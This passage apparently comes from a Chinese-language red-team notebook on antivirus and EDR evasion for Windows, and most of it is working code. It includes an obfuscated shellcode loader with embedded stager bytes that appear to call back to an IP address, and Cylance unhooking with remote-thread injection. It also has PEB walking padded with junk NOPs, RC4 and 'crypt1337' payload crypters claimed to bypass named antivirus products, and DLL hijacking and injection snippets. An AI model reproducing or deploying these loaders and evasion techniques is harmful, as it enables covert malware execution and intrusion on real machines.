		ZwProtectVirtualMemory = &ZwProtectVirtualMemory7SP1;
		NtCreateThread = &NtCreateThread7SP1;
		pWinVerInfo->SystemCall = 0x3C;
	}
	else if (_wcsicmp(pWinVerInfo->chOSMajorMinor, L"6.2") == 0) {
		lpOSVersion = L"8 or Server 2012";
		wprintf(L"	[+] Operating System is Windows %ls, build number %d\n", lpOSVersion, pWinVerInfo->dwBuildNumber);
		exit(1);
		wprintf(L"	[+] Mapping version specific System calls.\n");
		pWinVerInfo->SystemCall = 0x3D;
	}
	else if (_wcsicmp(pWinVerInfo->chOSMajorMinor, L"6.3") == 0) {
		lpOSVersion = L"8.1 or Server 2012 R2";
		wprintf(L"	[+] Operating System is Windows %ls, build number %d\n", lpOSVersion, pWinVerInfo->dwBuildNumber);
		wprintf(L"	[+] Mapping version specific System calls.\n");
		NtAllocateVirtualMemory = &NtAllocateVirtualMemory81;
		ZwProtectVirtualMemory = &ZwProtectVirtualMemory81;
		NtCreateThread = &NtCreateThread81;
		pWinVerInfo->SystemCall = 0x3E;
	}
	else {
		wprintf(L"	[!] OS Version not supported.\n\n");
		exit(1);
	}

	/*
	Shellcode 每三个字节替换成\x00 进行加密
	*/
	unsigned char data[] = "\x00\xe8\x89\x00\x00\x00\x00\x89\xe5\x00\xd2\x64\x00\x52\x30\x00\x52\x0c\x00\x52\x14\x00\x72\x28\x00\xb7\x4a\x00\x31\xff\x00\xc0\xac\x00\x61\x7c\x00\x2c\x20\x00\xcf\x0d\x00\xc7\xe2\x00\x52\x57\x00\x52\x10\x00\x42\x3c\x00\xd0\x8b\x00\x78\x85\x00\x74\x4a\x00\xd0\x50\x00\x48\x18\x00\x58\x20\x00\xd3\xe3\x00\x49\x8b\x00\x8b\x01\x00\x31\xff\x00\xc0\xac\x00\xcf\x0d\x00\xc7\x38\x00\x75\xf4\x00\x7d\xf8\x00\x7d\x24\x00\xe2\x58\x00\x58\x24\x00\xd3\x66\x00\x0c\x4b\x00\x58\x1c\x00\xd3\x8b\x00\x8b\x01\x00\x89\x44\x00\x24\x5b\x00\x61\x59\x00\x51\xff\x00\x58\x5f\x00\x8b\x12\x00\x86\x5d\x00\x6e\x65\x00\x00\x68\x00\x69\x6e\x00\x54\x68\x00\x77\x26\x00\xff\xd5\x00\x00\x00\x00\x00\x31\x00\x57\x57\x00\x57\x57\x00\x3a\x56\x00\xa7\xff\x00\xe9\xa4\x00\x00\x00\x00\x31\xc9\x00\x51\x6a\x00\x51\x51\x00\xbb\x01\x00\x00\x53\x00\x68\x57\x00\x9f\xc6\x00\xd5\x50\x00\x8c\x00\x00\x00\x5b\x00\xd2\x52\x00\x00\x32\x00\x84\x52\x00\x52\x53\x00\x50\x68\x00\x55\x2e\x00\xff\xd5\x00\xc6\x83\x00\x50\x68\x00\x33\x00\x00\x89\xe0\x00\x04\x50\x00\x1f\x56\x00\x75\x46\x00\x86\xff\x00\x5f\x31\x00\x57\x57\x00\xff\x53\x00\x68\x2d\x00\x18\x7b\x00\xd5\x85\x00\x0f\x84\x00\x01\x00\x00\x31\xff\x00\xf6\x74\x00\x89\xf9\x00\x09\x68\x00\xc5\xe2\x00\xff\xd5\x00\xc1\x68\x00\x21\x5e\x00\xff\xd5\x00\xff\x57\x00\x07\x51\x00\x50\x68\x00\x57\xe0\x00\xff\xd5\x00\x00\x2f\x00\x00\x39\x00\x75\x07\x00\x50\xe9\x00\xff\xff\x00\x31\xff\x00\x91\x01\x00\x00\xe9\x00\x01\x00\x00\xe8\x6f\x00\xff\xff\x00\x77\x42\x00\x6d\x00\x00\x42\xc6\x00\x6f\xba\x00\x3d\xd8\x00\xfc\x47\x00\xbc\xdc\x00\xe5\xb9\x00\x57\x1e\x00\xe6\xd9\x00\x4f\x31\x00\x37\x66\x00\x69\xf2\x00\xae\xf8\x00\x5d\xde\x00\x53\x49\x00\x59\x04\x00\x49\x62\x00\x1d\x70\x00\xd4\xcb\x00\x66\x6d\x00\x06\x5b\x00\xe8\xc7\x00\xf2\xcf\x00\xa7\x75\x00\x9a\xb0\x00\x00\x55\x00\x65\x72\x00\x41\x67\x00\x6e\x74\x00\x20\x4d\x00\x7a\x69\x00\x6c\x61\x00\x34\x2e\x00\x20\x28\x00\x6f\x6d\x00\x61\x74\x00\x62\x6c\x00\x3b\x20\x00\x53\x49\x00\x20\x37\x00\x30\x3b\x00\x57\x69\x00\x64\x6f\x00\x73\x20\x00\x54\x20\x00\x2e\x31\x00\x20\x54\x00\x69\x64\x00\x6e\x74\x00\x34\x2e\x00\x29\x0d\x00\x00\x65\x00\x75\x9d\x00\x44\xb7\x00\xc6\x44\x00\xdc\xc8\x00\x94\xf1\x00\x08\x48\x00\xac\xac\x00\xf0\xfa\x00\xf4\x24\x00\x95\xec\x00\xbe\x97\x00\x01\x5e\x00\x85\x66\x00\xd3\x11\x00\xd8\xb5\x00\x4b\x87\x00\x84\x9f\x00\x50\x09\x00\x54\x1b\x00\xc0\x50\x00\x75\xd9\x00\xa2\x05\x00\x23\x9d\x00\x5b\x20\x00\xf3\x86\x00\x3b\x9f\x00\x07\x77\x00\xa0\x8a\x00\x5a\x87\x00\x64\xd1\x00\xcf\xe2\x00\xa1\x26\x00\xdb\x63\x00\xca\x11\x00\x48\x45\x00\x5c\x05\x00\x42\x1e\x00\x9a\x23\x00\xb0\xe7\x00\xfa\x35\x00\xf4\xe3\x00\x31\xe0\x00\xcd\x8f\x00\xf8\x14\x00\x0f\x89\x00\x03\xa2\x00\xce\x2b\x00\x5f\x57\x00\x32\xac\x00\x3e\xad\x00\xa8\xc8\x00\x66\x01\x00\x6c\xa9\x00\x36\xed\x00\xa2\x57\x00\x95\x06\x00\x9b\x07\x00\xc4\x02\x00\x44\xf0\x00\x9e\x36\x00\x6f\xdf\x00\x33\xce\x00\xa9\xce\x00\xce\x0a\x00\xf4\xb9\x00\x5c\xae\x00\x23\xce\x00\xac\x8f\x00\x09\x85\x00\x37\xb9\x00\x25\x6b\x00\x38\xe3\x00\xda\xd9\x00\x96\x1c\x00\x0c\x00\x00\xf0\xb5\x00\x56\xff\x00\x6a\x40\x00\x00\x10\x00\x00\x68\x00\x00\x40\x00\x57\x68\x00\xa4\x53\x00\xff\xd5\x00\xb9\x00\x00\x00\x00\x00\xd9\x51\x00\x89\xe7\x00\x68\x00\x00\x00\x00\x00\x56\x68\x00\x96\x89\x00\xff\xd5\x00\xc0\x74\x00\x8b\x07\x00\xc3\x85\x00\x75\xe5\x00\xc3\xe8\x00\xfd\xff\x00\x31\x30\x00\x2e\x31\x00\x2e\x31\x00\x36\x2e\x00\x37\x00\x00\x00\x00\x00";
	char a1[] = "\xfc\x00\x60\x31\x8b\x8b\x8b\x8b\x0f\x26\x31\x3c\x02\xc1\x01\xf0\x8b\x8b\x01\x40\xc0\x01\x8b\x8b\x01\x3c\x34\xd6\x31\xc1\x01\xe0\x03\x3b\x75\x8b\x01\x8b\x8b\x01\x04\xd0\x24\x5b\x5a\xe0\x5a\xeb\x68\x74\x77\x69\x4c\x07\xe8\x00\xff\x57\x68\x79\xd5\x00\x5b\x51\x03\x68\x00\x50\x89\xff\xe9\x00\x31\x68\xc0\x52\x52\xeb\x3b\x89\xc3\x80\x00\x6a\x6a\x68\x9e\xd5\xff\x6a\x56\x06\xff\xc0\xca\x00\x85\x04\xeb\xaa\x5d\x89\x45\x31\x31\x6a\x56\xb7\x0b\xbf\x00\xc7\x58\x7b\xff\xe9\x00\xc9\x00\xff\x2f\x36\x8b\x20\xaf\xf5\xe9\xb6\xf5\x9b\x86\xbc\x09\x77\x40\x33\x2e\x1a\x31\x64\x02\xb6\x09\x07\xd3\x48\xa8\x73\x2d\x65\x3a\x6f\x6c\x2f\x30\x63\x70\x69\x65\x4d\x45\x2e\x20\x6e\x77\x4e\x35\x3b\x72\x65\x2f\x30\x0a\x1b\xb1\xb6\x11\xa7\x6e\x13\xc6\x3d\x5d\x24\x53\xc2\x36\x91\xfe\x53\x5a\x64\x3b\x31\x02\xf1\x0e\x22\x54\xa9\x33\x03\xa4\x27\x4e\xd9\x6b\xdc\x2f\x09\x3c\x3b\x8d\x26\x74\x43\x03\x83\x66\xc9\x1c\x0e\x9a\xef\x2b\x10\x15\xaf\x89\x8c\x1f\xcb\x51\x5c\xc1\x7a\xed\x94\x2b\x50\x72\x5c\x52\xc5\x97\x1b\xb3\x5c\x68\xa2\xd5\x68\x00\x00\x00\x58\xe5\x93\x00\x01\x53\x57\x20\x53\x12\xe2\x85\xc6\x01\xc0\x58\x89\xff\x33\x30\x39\x33\x00\x06";

	SIZE_T Size = sizeof(data);
	for (int i = 0; i < sizeof(a1); i++) {
		memcpy(&data[i * 3], &a1[i], 1);
	}

	PVOID lpvAddr = NULL;
	NTSTATUS status;

	status = NtAllocateVirtualMemory(GetCurrentProcess(), &lpvAddr, 0, &Size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	RtlMoveMemory(lpvAddr, data, sizeof(data));

	HANDLE ThreadHandle = NULL;
	CONTEXT NewThreadContext = { 0 };
	INITIAL_TEB InitialTeb = { 0 };
	OBJECT_ATTRIBUTES ObjAttr2 = { 0 };
	CLIENT_ID ReturnTid = { 0 };

	if (MyInitTeb(&InitialTeb) != 0) {
		return -1;
	}

	if (MyInitContext(
		&NewThreadContext,
		(PVOID)lpvAddr,
		NULL,
		InitialTeb.StackBase) != 0)
	{
		return -1;
	}
	InitializeObjectAttributes(&ObjAttr2, NULL, 0, NULL, NULL);
	status = ZwProtectVirtualMemory(GetCurrentProcess(), &lpvAddr, &Size, PAGE_EXECUTE, &OldProtection);

	status = NtCreateThread(
		&ThreadHandle,
		THREAD_ALL_ACCESS,
		&ObjAttr2,
		GetCurrentProcess(),
		&ReturnTid,
		&NewThreadContext,
		&InitialTeb,
		FALSE);

	WaitForSingleObject(ThreadHandle, INFINITE);
	//ULONG OldProtection;
	//status = ZwProtectVirtualMemory(GetCurrentProcess(), &lpvAddr, &Size, PAGE_EXECUTE, &OldProtection);

	//HANDLE s;
	//s = CreateThread(0, 0, lpvAddr, NULL, 0, 0);
	
	//WaitForSingleObject(s, INFINITE);
	return 0;
}
```

### Unhook EDR
杀软会hook关键函数,可以修改函数的头部来脱钩
另外 可以使用`系统直接调用`,绕过杀软对一些脱钩过程中使用的函数的hook

https://www.mdsec.co.uk/2019/03/silencing-cylance-a-case-study-in-modern-edrs/
![](https://i.loli.net/2021/01/18/KL4IJC3vYRsZQoz.jpg)
![-w947](https://i.loli.net/2021/01/18/K9RPtFXeNL3UWyx.jpg)
![-w548](https://i.loli.net/2021/01/18/Isw9zr6GDNKqBPe.jpg)

```c
//demo
#include <iostream>
#include <windows.h>
unsigned char buf[] =
"SHELLCODE_GOES_HERE";
struct syscall_table {
    int osVersion;
};
// Remove Cylance hook from DLL export
void removeCylanceHook(const char *dll, const char *apiName, char code) {
    DWORD old, newOld;
    void *procAddress = GetProcAddress(LoadLibraryA(dll), apiName);
    printf("[*] Updating memory protection of %s!%s\n", dll, apiName);
    VirtualProtect(procAddress, 10, PAGE_EXECUTE_READWRITE, &old);
    printf("[*] Unhooking Cylance\n");
    memcpy(procAddress, "\x4c\x8b\xd1\xb8", 4);
    *((char *)procAddress + 4) = code;
    VirtualProtect(procAddress, 10, old, &newOld);
}

int main(int argc, char **argv)
{
    if (argc != 2) {
        printf("Usage: %s PID\n", argv[0]);
        return 2;
    }
    DWORD processID = atoi(argv[1]);
    HANDLE proc = OpenProcess(PROCESS_ALL_ACCESS, false, processID);
    if (proc == INVALID_HANDLE_VALUE) {
        printf("[!] Error: Could not open target process: %d\n", processID);
        return 1;
    }
    printf("[*] Opened target process %d\n", processID);
    printf("[*] Allocating memory in target process with VirtualAllocEx\n");
    void *alloc = VirtualAllocEx(proc, NULL, sizeof(buf), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (alloc == (void*)0) {
        printf("[!] Error: Could not allocate memory in target process\n");
        return 1;
    }
    printf("[*] Allocated %d bytes at memory address %p\n", sizeof(buf), alloc);
    printf("[*] Attempting to write into victim process using WriteProcessMemory\n");
    if (WriteProcessMemory(proc, alloc, buf, sizeof(buf), NULL) == 0) {
        printf("[!] Error: Could not write to target process memory\n");
        return 1;
    }
    printf("[*] WriteProcessMemory successful\n");

    // Remove the NTDLL.DLL hook added by userland DLL
    removeCylanceHook("ntdll.dll", "ZwCreateThreadEx", 0xBB);
    printf("[*] Attempting to spawn shellcode using CreateRemoteThread\n");
    HANDLE createRemote = CreateRemoteThread(proc, NULL, 0, (LPTHREAD_START_ROUTINE)alloc, NULL, 0, NULL);
    printf("[*] Success :D\n");
}
```

### 动态调用 API 函数
```c
void* ntAllocateVirtualMemory = GetProcAddress(LoadLibraryA("ntdll.dll"), "NtAllocateVirtualMemory");
```

https://4hou.win/wordpress/?cat=612

通过动态调用 API 函数的方式来调用 virtualalloc 函数。具体的做法是， load kernel32.dll 库，使用汇编语言从 kernel32 库中取得 virtualalloc 函数在内存中的地址，然后执行。
另外,假设Loadlibrary函数也被hook了(这也太硬核了),我们也可以从PEB中获取函数地址,下面代码demo为Load kernel32.dll, 再有甚者,对机器码做了模式匹配,我们可以在代码中加入一些nop指令或者一些正常功能的垃圾混淆代码。
```c
//HMODULE hModule =LoadLibrary(_T("Kernel32.dll"));
HMODULE hModule = NULL;

//LoadLibrary 记得从中加入一些nop指令(空指令雪橇)
//空指令雪橇原理: 针对机器码匹配的话基本是进行模式匹配的
	__asm {

		mov esi, fs: [0x30]//得到PEB地址
     nop
     nop
		mov esi, [esi + 0xc]//指向PEB_LDR_DATA结构的首地址
		mov esi, [esi + 0x1c]//一个双向链表的地址
		mov esi, [esi]//得到第二个条目kernelBase的链表
		mov esi, [esi]//得到第三个条目kernel32链表（win10）
		mov esi, [esi + 0x8] //kernel32.dll地址
		mov hModule, esi
	}

HANDLE shellcode_handler;
FARPROC Address = GetProcAddress(hModule,"VirtualAlloc");//拿到virtualalloc的地址
_asm
{
      push 40h  //push传参
      push 1000h
      push 29Ah
      push 0
      call Address  //函数调用
      mov shellcode_handler, eax
}
memcpy(shellcode_handler, newshellcode,sizeof newshellcode);
((void(*)())shellcode_handler)();
```

### 垃圾混淆代码---nop nop空指令雪橇

```c
_asm {
mov esi, fs:[0x30]//得到PEB地址
NOP
NOP
NOP
NOP
NOP
mov esi, [esi + 0xc]//指向PEB_LDR_DATA结构的首地址
NOP
NOP
NOP
NOP
mov esi, [esi + 0x1c]//一个双向链表的地址
NOP
NOP
NOP
NOP
mov esi, [esi]//得到第二个条目kernelBase的链表
NOP
NOP
NOP
mov esi, [esi]//得到第三个条目kernel32链表（win10）
NOP
NOP
mov esi, [esi + 0x8] //kernel32.dll地址
NOP
NOP
mov hModule, esi
}
```
### 父进程欺骗

### Windows 10进程镂空技术
https://4hou.win/wordpress/?p=20680

### Process Doppelgänging
https://www.4hou.com/technology/9379.html
https://juejin.im/entry/5be26746e51d456a09717c9a

## Encrypt

### AES
//encrypt
```c#
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;

public static class Encrypt{
    static byte[] KEY = null;
    static byte[] IV = null;
    static byte[] payload = null;
       
    private static byte[] EncryptBytes(IEnumerable<byte> bytes){
        //The ICryptoTransform is created for each call to this method as the MSDN documentation indicates that the public methods may not be thread-safe and so we cannot hold a static reference to an instance
        using (var r = Rijndael.Create()){
            using (var encryptor = r.CreateEncryptor(KEY, IV)){
                return Transform(bytes, encryptor);
            }
        }
    }
    private static byte[] DecryptBytes(IEnumerable<byte> bytes)
    {
        //The ICryptoTransform is created for each call to this method as the MSDN documentation indicates that the public methods may not be thread-safe and so we cannot hold a static reference to an instance
        using (var r = Rijndael.Create())
        {
            using (var decryptor = r.CreateDecryptor(KEY, IV))
            {
                return Transform(bytes, decryptor);
            }
        }
    }
    private static byte[] Transform(IEnumerable<byte> bytes, ICryptoTransform transform){
        using (var stream = new MemoryStream()){
            using (var cryptoStream = new CryptoStream(stream, transform, CryptoStreamMode.Write)){
                foreach (var b in bytes)
                    cryptoStream.WriteByte(b);
            }

            return stream.ToArray();
        }
    }
    public static class Encryption_Class
    {
        public static string Encrypt(string key, string data){
            Encoding unicode = Encoding.Unicode;

            return Convert.ToBase64String(Encrypt(unicode.GetBytes(key), unicode.GetBytes(data)));
        }

        public static string Decrypt(string key, string data){
            Encoding unicode = Encoding.Unicode;

            return unicode.GetString(Encrypt(unicode.GetBytes(key), Convert.FromBase64String(data)));
        }

        public static byte[] Encrypt(byte[] key, byte[] data){
            return EncryptOutput(key, data).ToArray();
        }

        public static byte[] Decrypt(byte[] key, byte[] data){
            return EncryptOutput(key, data).ToArray();
        }

        private static byte[] EncryptInitalize(byte[] key){
            byte[] s = Enumerable.Range(0, 256)
              .Select(i => (byte)i)
              .ToArray();
            for (int i = 0, j = 0; i < 256; i++){
                j = (j + key[i % key.Length] + s[i]) & 255;

                Swap(s, i, j);
            }
            return s;
        }

        private static IEnumerable<byte> EncryptOutput(byte[] key, IEnumerable<byte> data)
        {
            byte[] s = EncryptInitalize(key);
            int i = 0;
            int j = 0;
            return data.Select((b) =>{
                i = (i + 1) & 255;
                j = (j + s[i]) & 255;
                Swap(s, i, j);
                return (byte)(b ^ s[(s[i] + s[j]) & 255]);
            });
        }
        private static void Swap(byte[] s, int i, int j){
            byte c = s[i];
            s[i] = s[j];
            s[j] = c;
        }
    }
}
```
//decrypt
```c#
string Payload_Encrypted;
Payload_Encrypted = "240,222,148,160,253,139,204,128,168,11,132,74";
string[] Payload_Encrypted_Without_delimiterChar = Payload_Encrypted.Split(',');
byte[] _X_to_Bytes = new byte[Payload_Encrypted_Without_delimiterChar.Length];
for (int i = 0; i < Payload_Encrypted_Without_delimiterChar.Length; i++)
{
    byte current = Convert.ToByte(Payload_Encrypted_Without_delimiterChar[i].ToString());
    _X_to_Bytes[i] = current;
}
byte[] KEY = { 0x11, 0x22, 0x21, 0x00, 0x33, 0x01, 0xd0, 0x00, 0x00, 0xa1, 0x00, 0x00, 0x00, 0x00, 0x00, 0x11, 0x00, 0x11, 0x01, 0x11, 0x11, 0x00, 0x00 };
byte[] Finall_Payload = Decrypt(KEY, _X_to_Bytes);

UInt32 funcAddr = VirtualAlloc(0, (UInt32)Finall_Payload.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
Marshal.Copy(Finall_Payload, 0, (IntPtr)(funcAddr), Finall_Payload.Length);
IntPtr hThread = IntPtr.Zero;
UInt32 threadId = 0;
IntPtr pinfo = IntPtr.Zero;
uint lpflOldProtect = 0x01;
VirtualProtect((IntPtr)(funcAddr), (UInt32)Finall_Payload.Length, 0x10, lpflOldProtect);
/// execute native code
hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
WaitForSingleObject(hThread, 0xFFFFFFFF);
```

### shellcode 字节替换
#### xor
#### crypt1337
bypass 360 火绒 电脑管家 defender NOD32 
~~卡巴斯基~~
```c#
//encrypt
using System;
using System.Text;

namespace cryprt1337encrypt
{
    class Program
    {
        static void Main(string[] args)
        {
            byte[] buf = new byte[835] { xxxx };
            String s;
            s = l337CryptPlusPlus(buf);
            Console.WriteLine(s);
        }
        private static string l337CryptPlusPlus(byte[] buf)
        {
            StringBuilder lolbuf = new StringBuilder();
            lolbuf.Append("byte[] hahabuf = new byte[");
            lolbuf.Append(buf.Length);
            lolbuf.Append("]{ ");

            byte[] bufclone = (byte[])buf.Clone();
            for (int i = 0; i < buf.Length; i++)
            {
                for (int n = 0; n < i; n++)
                {
                    bufclone[i]++;
                }
                lolbuf.Append("0x");
                lolbuf.AppendFormat("{0:x2}", bufclone[i]);
                if (i < buf.Length - 1)
                    lolbuf.Append(", ");
            }
            lolbuf.Append(" };");
            return lolbuf.ToString();
        }
    }
}
```

```c#
//decrypt
using System;
using System.Text;
using System.Runtime.InteropServices;

private static byte[] l337deCryptPlusPlus(byte[] buf)
{
    StringBuilder lolbuf = new StringBuilder();

    byte[] bufclone = (byte[])buf.Clone();
    for (int i = 0; i < buf.Length; i++)
    {
        for (int n = 0; n < i; n++)
        {
            bufclone[i]--;
        }
    }
    return bufclone;
}
```

完整版
```C#
//加密shellcode
using System;
using System.Text;

namespace cryprt1337encrypt
{
    class Program
    {
        static void Main(string[] args)
        {
            byte[] buf = new byte[835] { xxxx };
            String s;
            s = l337CryptPlusPlus(buf);
            Console.WriteLine(s);
        }
        private static string l337CryptPlusPlus(byte[] buf)
        {
            StringBuilder lolbuf = new StringBuilder();
            lolbuf.Append("byte[] hahabuf = new byte[");
            lolbuf.Append(buf.Length);
            lolbuf.Append("]{ ");

            byte[] bufclone = (byte[])buf.Clone();
            for (int i = 0; i < buf.Length; i++)
            {
                for (int n = 0; n < i; n++)
                {
                    bufclone[i]++;
                }
                lolbuf.Append("0x");
                lolbuf.AppendFormat("{0:x2}", bufclone[i]);
                if (i < buf.Length - 1)
                    lolbuf.Append(", ");
            }
            lolbuf.Append(" };");
            return lolbuf.ToString();
        }
    }
}

// 输入加密的shellcode，编译exe
using System;
using System.Text;
using System.Runtime.InteropServices;


namespace crypt1337
{
    class Program
    {
        const int SW_HIDE = 0;
        const int SW_SHOW = 5;
        private static UInt32 MEM_COMMIT = 0x1000;
        private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;
        static void Main(string[] args)
        {
            byte[] haha = new byte[835] { encrypt_shellcode };
            byte[] heihei = l337deCryptPlusPlus(haha);

            UInt32 funcAddr = VirtualAlloc(0, (UInt32)heihei.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
            Marshal.Copy(heihei, 0, (IntPtr)(funcAddr), heihei.Length);
            IntPtr hThread = IntPtr.Zero;
            UInt32 threadId = 0;
            IntPtr pinfo = IntPtr.Zero;
            uint lpflOldProtect = 0x01;
            VirtualProtect((IntPtr)(funcAddr), (UInt32)heihei.Length, 0x10, lpflOldProtect);
            /// execute native code
            hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
            WaitForSingleObject(hThread, 0xFFFFFFFF);
        }
        private static byte[] l337deCryptPlusPlus(byte[] buf)
        {
            StringBuilder lolbuf = new StringBuilder();

            byte[] bufclone = (byte[])buf.Clone();
            for (int i = 0; i < buf.Length; i++)
            {
                for (int n = 0; n < i; n++)
                {
                    bufclone[i]--;
                }
            }
            return bufclone;
        }

        [DllImport("kernel32")]
        private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);
        [DllImport("kernel32")]
        public static extern Boolean VirtualProtect(IntPtr lpAddress, UInt32 dwSize, uint flNewProtect, uint lpflOldProtect);
        [DllImport("kernel32")]
        private static extern bool VirtualFree(IntPtr lpAddress, UInt32 dwSize, UInt32 dwFreeType);
        [DllImport("kernel32")]
        private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);
        [DllImport("kernel32")]
        private static extern bool CloseHandle(IntPtr handle);
        [DllImport("kernel32")]
        private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
        [DllImport("kernel32")]
        private static extern IntPtr GetModuleHandle(string moduleName);
        [DllImport("kernel32")]
        private static extern UInt32 GetProcAddress(IntPtr hModule, string procName);
        [DllImport("kernel32")]
        private static extern UInt32 LoadLibrary(string lpFileName);
        [DllImport("kernel32")]
        private static extern UInt32 GetLastError();
        [DllImport("kernel32")]
        static extern IntPtr GetConsoleWindow();
        [DllImport("User32")]
        private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
    }
}
```
#### 字节替换
```c
//encrypt
import sys
def main(argv):
    filename = argv[1]
    with open(filename,"r") as f:
        st = f.read()
        s = st.split(" \"")[1].split("\";")[0].replace("\\x"," ")[1:]
        tmp_1 = ""
        tmp_2 = ""
        s = s.split(" ")
        for i in range(len(s)):
            if i % 3 == 0:
                tmp_1 = tmp_1 + "\\x" + s[i]
                s[i] = "00"

        t = "\\x".join(s)
        print("unsigned char data[] = \"\\x"+t+"\";")
        print("char a1[] = \""+tmp_1+"\";")

if __name__ == "__main__":
    main(sys.argv)
```

```c
//decrypt
for (int i = 0; i < sizeof(a1); i++) {
	memcpy(&data[i * 3], &a1[i], 1);
}
```

## Dll hijacking
### 通用Dll劫持技术---SuperHijacking

https://anhkgg.com/dllhijack/
https://github.com/anhkgg/anhkgg-tools
![-w503](https://i.loli.net/2021/01/18/L15tG9ci3UAIpla.jpg)

![-w530](https://i.loli.net/2021/01/18/8fejE1ApGcMwSOZ.jpg)

代码实现
```c
void* NtCurrentPeb()
{
	__asm {
		mov eax, fs:[0x30];
	}
}
PEB_LDR_DATA* NtGetPebLdr(void* peb)
{
	__asm {
		mov eax, peb;
		mov eax, [eax + 0xc];
	}
}
VOID SuperDllHijack(LPCWSTR dllname, HMODULE hMod)
{
	WCHAR wszDllName[100] = { 0 };
	void* peb = NtCurrentPeb();
	PEB_LDR_DATA* ldr = NtGetPebLdr(peb);

//InLoadOrderModuleList; 模块加载顺序
	for (LIST_ENTRY* entry = ldr->InLoadOrderModuleList.Blink;
		entry != (LIST_ENTRY*)(&ldr->InLoadOrderModuleList);
		entry = entry->Blink) {
		PLDR_DATA_TABLE_ENTRY data = (PLDR_DATA_TABLE_ENTRY)entry;

		memset(wszDllName, 0, 100 * 2);
		memcpy(wszDllName, data->BaseDllName.Buffer, data->BaseDllName.Length);

		if (!_wcsicmp(wszDllName, dllname)) {
			data->DllBase = hMod;
			break;
		}
	}
}
VOID DllHijack(HMODULE hMod)
{
	TCHAR tszDllPath[MAX_PATH] = { 0 };

	GetModuleFileName(hMod, tszDllPath, MAX_PATH);
	PathRemoveFileSpec(tszDllPath);
	PathAppend(tszDllPath, TEXT("mydll.dll.1"));

	HMODULE hMod1 = LoadLibrary(tszDllPath);

	SuperDllHijack(L"mydll.dll", hMod1);
}
BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        DllHijack(hModule);
        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
```

InLoadOrderModuleList  确认模块加载顺序

核心函数
```c
//向前遍历peb->ldr找到mydll.dll的ldrentry，然后修改dllbase为hMod
	for (LIST_ENTRY* entry = ldr->InLoadOrderModuleList.Blink;
		entry != (LIST_ENTRY*)(&ldr->InLoadOrderModuleList);
		entry = entry->Blink) {
		PLDR_DATA_TABLE_ENTRY data = (PLDR_DATA_TABLE_ENTRY)entry;

		memset(wszDllName, 0, 100 * 2);
		memcpy(wszDllName, data->BaseDllName.Buffer, data->BaseDllName.Length);

		if (!_wcsicmp(wszDllName, dllname)) {
			data->DllBase = hMod;
			break;
		}
	}
```

![-w837](https://i.loli.net/2021/01/18/5piGw7DIMQoCqeA.jpg)

![-w987](https://i.loli.net/2021/01/18/81g2XzoWVwxCvKa.jpg)

![-w878](https://i.loli.net/2021/01/18/843SAxOLsgXoUFi.jpg)


## Dll injection
总结: https://www.cnblogs.com/uAreKongqi/p/6012353.html
### 摘要
常见方法：
* 创建新线程
* 插入Apc队列
* 手动实现LoadLibrary
* ~~修改注册表~~
* ~~挂钩窗口消息~~
* ~~设置线程上下背景文，修改寄存器~~

### CreateRemoteThread(NewProcess)
Sysmon对Event ID 8: CreateRemoteThread有监控

```c
STARTUPINFOEXA si;
PROCESS_INFORMATION pi;

ZeroMemory(&si, sizeof(si));
si.StartupInfo.cb = sizeof(STARTUPINFOEXA);
si.StartupInfo.dwFlags = STARTF_USESHOWWINDOW;

BOOL success = CreateProcessA(
		NULL,
		(LPSTR)"C:\\Windows\\System32\\mblctr.exe",
		NULL,
		NULL,
		true,
		CREATE_SUSPENDED | EXTENDED_STARTUPINFO_PRESENT,
		NULL,
		NULL,
		reinterpret_cast<LPSTARTUPINFOA>(&si),
		&pi);
	// Assign our attribute

	HANDLE notepadHandle = pi.hProcess;
	LPVOID remoteBuffer = VirtualAllocEx(notepadHandle, NULL, sizeof data, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
	
WriteProcessMemory(notepadHandle, remoteBuffer, data, sizeof data, NULL);
	HANDLE remoteThread = CreateRemoteThread(notepadHandle, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);

if (WaitForSingleObject(remoteThread, INFINITE) == WAIT_FAILED) {
	return 1;
}
```

### 异步过程调用(APC)注入

1. 概念
APC可以看成就是内核里的定时器, 为了给自己一个在本函数返回后还能执行的一次机会, 有很多操作是需要在函数返回后才能执行, APC类似于析构函数但不完全是.


2. 特点
apc的最大特点就是在本函数返回后才执行, 而且是在本线程中.

对于用户模式下的APC队列，当线程处在`alertable`状态时才去执行这些APC函数。因此，在ring3 User-Mode下最暴力的办法就是给每个线程设置成alertable（遍历线程的时候从后往前遍历着插入就不会崩溃）

> alertable “可唤醒的”
> SleepEx()---->KeDelayExecutionThread()
> WaitForSingleObject()---->KeWaitForSingleObject()
> WaitForMultipleObjects()---->KeWaitForMultipleObjects()
> 
> 当上述调用发生时，线程Alertable被置为TRUE。同时，还会通过宏TestForAlertPending设置KTHREAD的另外一个成员：UserApcPending，当Alertable为TRUE，并且User APC队列不为空，那么该值将被置为TRUE。

APC注入分为内核（驱动）APC注入 和 User-Mode APC注入两种，在内核态进行APC注入时不需要考虑`alertable`

3. 执行时间
apc它的执行时机有多，比如在线程wait、线程切换到应用层、线程被挂起等等等等,而且apc也分几个层次的优先级.就是说apc一般是不太需要立马执行的低优先级的函数。所以一旦线程有空隙了，windows就会执行一下.

